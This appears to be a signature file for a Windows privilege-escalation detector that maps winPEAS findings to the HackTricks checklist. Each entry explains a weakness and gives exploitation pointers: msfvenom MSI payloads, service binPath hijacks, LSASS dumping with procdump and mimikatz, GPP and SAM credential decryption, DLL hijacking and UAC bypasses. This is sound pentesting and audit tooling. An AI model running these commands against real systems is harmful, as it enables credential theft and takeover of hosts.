column1: # Windows privilege-escalation signatures, mapped to the HackTricks "Local Windows Privilege
# Escalation" checklist. The winprivesc detector matches each `pattern` (a case-insensitive
# regex) against every line of a winPEAS run or a raw enum snippet, and reports the ones that
# hit with a plain-English "what it is" and "where to look / how to abuse it".
# ADD YOUR OWN: append a row. pattern is Java regex (case-insensitive, no need for (?i)), tabs
# separate columns, and `next` is the exploitation pointer. category is just for grouping.
# id                pattern    severity  category  title  meaning  next

column6: meaning
column7: next

column6: Both the HKLM and HKCU policy are set, so any .msi is installed with SYSTEM rights. One of the cleanest local escalations there is.
column7: msfvenom -f msi -p windows/x64/exec CMD=... -o e.msi ; msiexec /quiet /qn /i e.msi   (checklist: AlwaysInstallElevated)

column6: A service's binary path has spaces and no quotes, so Windows tries C:\Program.exe, C:\Program Files\App.exe, ... in turn. If you can write an earlier prefix, your exe runs as the service account.
column7: drop your exe at the writable prefix and restart the service (sc stop/start)   (checklist: unquoted service binary path)

column6: You have write access to a service definition, its binary, or its folder - replace the binary or repoint ImagePath and it runs as the service account (often SYSTEM).
column7: sc config <svc> binPath= "C:\path\evil.exe" ; sc stop/start <svc>   (checklist: modify a service or its binary)

column5: Service permissions grant control to normal users
column6: The service ACL lets a non-admin group change its configuration or start/stop it - enough to point it at your binary.
column7: accesschk.exe -uwcqv <group> <svc> ; sc config binPath=   (checklist: modify a service)

column6: You can write a service's registry key - set ImagePath (or a FailureCommand) to your binary and it runs as the service account.
column7: reg add ...\Services\<svc> /v ImagePath /d evil.exe /f   (checklist: modify the registry of a service)

column6: Updates are fetched over HTTP, so a man-in-the-middle can serve a malicious "update" that runs as SYSTEM.
column7: WSUSpendu / pywsus with an ARP/DNS MITM   (checklist: WSUS exploit)

column6: User Account Control is off, so an admin-group token is already fully elevated - no bypass needed.
column7: run your payload; the medium/high integrity split is gone   (checklist: UAC)

column5: UAC elevates admins with no prompt
column6: Admins are auto-elevated silently, which makes several UAC bypasses trivial.
column7: fodhelper / computerdefaults UAC bypass   (checklist: UAC)

column6: LSASS keeps cleartext passwords in memory, so a dump yields plaintext, not just hashes.
column7: procdump -ma lsass.exe then mimikatz sekurlsa::wdigest   (checklist: WDigest)

column6: LSASS is not protected as a PPL, so its memory can be dumped for credentials.
column7: procdump/comsvcs MiniDump lsass then mimikatz   (checklist: LSA Protection)

column6: Domain credentials are not isolated in VBS, so LSASS dumping recovers them.
column7: dump LSASS as above   (checklist: Credentials Guard)

column6: Local administrator passwords are not randomised per host, so one recovered local admin password may work everywhere.
column7: spray a recovered local admin hash/password across the network   (checklist: LAPS)

column6: Winlogon stores a cleartext auto-logon username and password under the registry.
column7: reg query "HKLM\...\Winlogon" ; read DefaultUserName / DefaultDomainName / DefaultPassword   (checklist: Winlogon credentials)

column6: PowerShell saves every command here, frequently including passwords typed on the command line.
column7: type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   (checklist: passwords in PowerShell history)

column6: Sysprep/unattend answer files routinely embed a base64-encoded local administrator password.
column7: find the <Password><Value> and base64-decode it   (checklist: passwords in unattended files)

column6: GPP files store a "cpassword" encrypted with an AES key Microsoft published, so it is trivially reversible.
column7: gpp-decrypt <cpassword>   (checklist: cached GPP password)

column6: A copy of the hive(s) holding local (or domain) password hashes.
column7: secretsdump.py -sam SAM -system SYSTEM LOCAL   (checklist: SAM & SYSTEM backup)

column6: Stored credentials you can use without knowing the password via runas /savecred.
column7: runas /savecred /user:<user> "C:\path\evil.exe"   (checklist: passwords in recently run commands)

column6: Web and IIS config files hold database and application credentials, sometimes only lightly encrypted.
column7: aspnet_regiis -pdf connectionStrings, or read the file directly   (checklist: IIS web config password)

column6: Holds an obfuscated domain service-account password with a well-known key.
column7: decrypt the SiteList.xml password (public tooling)   (checklist: McAfee SiteList)

column6: The pre-shared key of a stored wireless profile can be printed in cleartext.
column7: netsh wlan show profile <ssid> key=clear   (checklist: saved Wifi passwords)

column6: Saved PuTTY sessions can contain a cleartext ProxyPassword and cached SSH host keys.
column7: reg query HKCU\Software\SimonTatham\PuTTY\Sessions   (checklist: Putty creds)

column6: Saved RDP connections (and .rdp files) can reveal hosts and, via Credential Manager, reusable credentials.
column7: dir /a %USERPROFILE%\Documents\Default.rdp ; check Credential Manager   (checklist: saved RDP connections)

column6: If AppCmd.exe exists you can often recover IIS application-pool credentials in cleartext.
column7: appcmd.exe list apppool /@t:*   (checklist: AppCmd.exe credentials)

column6: SCCM's SCClient.exe is prone to DLL side-loading, a route to code execution / escalation.
column7: plant a hijack DLL alongside it   (checklist: SCClient DLL side loading)

column6: Private SSH keys on disk or cached in the registry can unlock other hosts.
column7: copy the key / query the OpenSSH agent registry   (checklist: SSH keys / Putty host keys)

column6: Cloud CLI credential files grant access to the account's cloud resources.
column7: read the credential file and use the cloud CLI   (checklist: cloud credentials)

column6: A directory in the system PATH that you can write to. Plant a DLL (or a shadowing exe) that a privileged process loads or runs.
column7: drop a malicious DLL/exe there matching what a service loads   (checklist: write in a PATH folder / DLL hijacking)

column6: A privileged process tries to load a DLL that does not exist; if any search-path directory is writable, your DLL loads instead.
column7: place the named DLL in a writable search-path directory   (checklist: known service binary loading a non-existent DLL)

column6: You can write to a Startup folder or Run key target, so your code runs when that user logs in.
column7: drop a payload in the Startup folder / set a Run value   (checklist: startup applications)

column6: You can overwrite a binary of an installed application; if it runs as a service or at a higher privilege, that is code execution.
column7: replace the binary and wait for it to run   (checklist: write permissions on installed applications)

column6: A loaded kernel driver with a known vulnerability - a route to ring-0 code execution (BYOVD).
column7: map the driver to a known exploit (loldrivers)   (checklist: vulnerable drivers)

column6: The spooler enables PrintNightmare (CVE-2021-34527) and is a coercion source for Potato attacks.
column7: check patch level; PrintNightmare / PrintSpoofer   (checklist: service triggers / privileged services)

column6: Real-time protection is off, so tooling runs without being caught or cleaned.
column7: stage and run your tooling directly   (checklist: check if any AV)

column6: AppLocker controls which binaries run. Note the enforcement mode and look for writable allowed paths / LOLBin bypasses.
column7: enumerate rules; abuse a writable allowed path or an interpreter bypass   (checklist: AppLocker policy)

column6: The host caches domain logons (mscash), which can be dumped and cracked offline.
column7: dump cached hashes and crack (hashcat -m 2100)   (checklist: cached credentials)

column6: Only reachable from the box itself - often an admin panel or DB with weaker auth. Reach it via a tunnel or local exploit.
column7: port-forward or exploit it locally   (checklist: hidden local services on 127.0.0.1)

column6: Deleted files (scripts, configs, backups) in the Recycle Bin sometimes still hold credentials.
column7: dir /a on the $Recycle.Bin SID folders   (checklist: files in the Recycle Bin)

column6: An environment variable appears to hold a password, key or token in cleartext.
column7: read the variable value; try it elsewhere   (checklist: interesting info in env vars)

column6: A handle to a privileged process may be inheritable, letting you duplicate its token or inject.
column7: duplicate the handle's token / inject   (checklist: leaked handlers)

column6: A named pipe a privileged client connects to can let you impersonate that client's token.
column7: create/hook the pipe and call ImpersonateNamedPipeClient   (checklist: pipe client impersonation)
